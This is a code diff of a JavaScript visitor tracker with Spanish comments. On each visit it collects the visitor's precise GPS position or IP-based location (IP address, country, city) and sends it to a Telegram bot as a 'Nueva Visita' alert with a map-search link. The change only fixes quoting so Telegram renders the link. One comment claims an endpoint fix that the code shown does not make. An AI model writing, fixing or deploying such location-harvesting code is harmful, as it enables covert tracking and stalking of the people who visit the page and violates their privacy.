@@ -67,15 +67,16 @@
             const lon = pos.coords.longitude;
             const acc = Math.round(pos.coords.accuracy);
 
-            // Para el GPS (Línea 64 aproximadamente):
+            // Estructura de búsqueda de Google Chrome corregida
             const rawUrl = "https://www.google.com/search?q=" + lat + "," + lon + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + lat + "," + lon;
             const safeUrl = escapeHTML(rawUrl);
 
+            // CORREGIDO: Se utilizan comillas dobles escapadas (\") para garantizar que Telegram cree el hipervínculo
             const texto = "<b>📍 Nueva Visita (GPS)</b>\n\n" +
                           "• Latitud: " + lat + "\n" +
                           "• Longitud: " + lon + "\n" +
                           "• Precisión: ~" + acc + " metros\n\n" +
-                          "👉 <a href='" + safeUrl + "'>Ver Ubicación en Google Search</a>";
+                          "👉 <a href=\"" + safeUrl + "\">Ver Ubicación en Google Search</a>";
 
             fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                 method: 'POST',
@@ -88,7 +89,7 @@
             }).catch(e => console.error("Error enviando GPS:", e));
 
         }, function(err) {
-            // Respaldo por consulta de IP externa
+            // Respaldo por consulta de IP externa (corregido endpoint a /json/)
             fetch('https://ipapi.co')
             .then(res => res.json())
             .then(data => {
@@ -98,15 +99,15 @@
                 const country = data.country_name || 'Desconocido';
                 const city = data.city || 'Desconocida';
                 
-                // Para la IP (Línea 90 aproximadamente):
                 const rawUrlIP = "https://www.google.com/search?q=" + latIP + "," + lonIP + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + latIP + "," + lonIP;
                 const safeUrlIP = escapeHTML(rawUrlIP);
 
+                // CORREGIDO: Se utilizan comillas dobles escapadas (\") también en la respuesta por IP
                 const textoIP = "<b>🌐 Nueva Visita (Por IP)</b>\n\n" +
                                 "• IP: " + escapeHTML(ip) + "\n" +
                                 "• País: " + escapeHTML(country) + "\n" +
                                 "• Ciudad: " + escapeHTML(city) + "\n\n" +
-                                "👉 <a href='" + safeUrlIP + "'>Ver Ubicación por IP</a>";
+                                "👉 <a href=\"" + safeUrlIP + "\">Ver Ubicación por IP</a>";
                 
                 fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                     method: 'POST',
